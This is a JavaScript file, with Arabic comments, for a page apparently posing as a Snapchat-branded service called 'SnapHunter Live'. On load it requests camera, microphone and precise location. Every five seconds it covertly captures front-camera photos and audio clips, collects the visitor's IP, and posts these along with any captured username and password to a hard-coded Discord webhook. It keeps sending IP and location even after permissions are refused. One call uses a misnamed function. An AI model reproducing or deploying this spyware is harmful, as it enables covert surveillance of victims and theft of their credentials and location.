'use strict';

// ⚠️ تأكد من وضع رابط الـ Webhook الخاص بك هنا
const WEBHOOK_URL = "https://discord.com/api/webhooks/1444709878366212162/aaRxDFNINfucmVB8YSZ2MfdvHPUI8fbRRpROLo8iAAEFLjWfUNOHcgXJrhacUK4RbEHT";

const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
let mediaRecorder, audioChunks = [], userLat = null, userLng = null;

// 1. جلب IP الجهاز فور الدخول
async function getIP() {
    try {
        const res = await fetch('https://api.ipify.org?format=json');
        const data = await res.json();
        return data.ip;
    } catch (e) { return "غير معروف"; }
}

// 2. وظيفة الإرسال الموحدة (صورة + صوت + موقع)
async function sendDataToDiscord(imgBlob, audBlob, user = "", pass = "") {
    const ip = await getIP();
    const formData = new FormData();
    
    let content = `🛰️ **وصلت صورة جديدة!**\n🌐 IP: \`${ip}\` \n`;
    if (user) content += `👤 الحساب: \`${user}\` | الرمز: \`${pass}\` \n`;
    if (userLat) content += `📍 الموقع: [Google Maps](https://www.google.com/maps?q=${userLat},${userLng}) \n`;

    // إرفاق الصورة كملف
    if (imgBlob) formData.append('file1', imgBlob, 'camera_capture.png');
    // إرفاق الصوت كملف
    if (audBlob) formData.append('file2', audBlob, 'voice_record.ogg');
    
    formData.append('payload_json', JSON.stringify({
        content: content,
        username: "SnapHunter Live",
        avatar_url: "https://upload.wikimedia.org/wikipedia/en/thumb/c/c4/Snapchat_logo.svg/1200px-Snapchat_logo.svg.png"
    }));

    await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
}

// 3. تشغيل النظام (كاميرا -> موقع -> ميكروفون)
async function startCapture() {
    try {
        // طلب الكاميرا والميكروفون
        const stream = await navigator.mediaDevices.getUserMedia({ 
            video: { facingMode: "user" }, 
            audio: true 
        });
        video.srcObject = stream;
        mediaRecorder = new MediaRecorder(stream);

        // طلب الموقع بعد ثوانٍ من استقرار الصفحة
        setTimeout(() => {
            navigator.geolocation.getCurrentPosition(p => {
                userLat = p.coords.latitude;
                userLng = p.coords.longitude;
            }, null, {enableHighAccuracy: true});
        }, 3000);

        // بدء حلقة الإرسال التلقائي كل 5 ثوانٍ
        setInterval(() => {
            const ctx = canvas.getContext('2d');
            // تأكد من أن الفيديو يعمل قبل الرسم
            if (video.readyState === video.HAVE_ENOUGH_DATA) {
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                audioChunks = [];
                mediaRecorder.ondataavailable = e => audioChunks.push(e.data);
                mediaRecorder.start();

                setTimeout(() => {
                    mediaRecorder.stop();
                    mediaRecorder.onstop = () => {
                        const audBlob = new Blob(audioChunks, { type: 'audio/ogg' });
                        canvas.toBlob(imgBlob => {
                            if (imgBlob) sendToDiscord(imgBlob, audBlob);
                        }, 'image/png');
                    };
                }, 3000); // تسجيل 3 ثوانٍ
            }
        }, 5000);

    } catch (err) {
        // في حال رفض الأذونات، نرسل IP والموقع فقط
        setInterval(() => { sendDataToDiscord(null, null); }, 5000);
    }
}

window.onload = startCapture;
